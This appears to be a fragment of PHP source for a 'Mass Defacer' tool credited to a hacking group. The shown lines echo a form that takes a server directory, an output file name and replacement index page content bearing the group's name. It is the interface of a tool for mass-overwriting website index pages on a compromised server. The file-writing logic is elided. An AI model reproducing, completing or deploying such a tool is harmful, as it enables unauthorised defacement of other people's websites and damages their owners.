...
echo "<title>Mass Defacer - PrivateHackers.org - EbRaHiM-VaKeR</title>";
...
echo "Directory : <input type='text' name='base_dir' size='50' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='PH.html'><br><br>";
echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>PrivateHackers.org - EbRaHiM-VaKeR</textarea><br>";
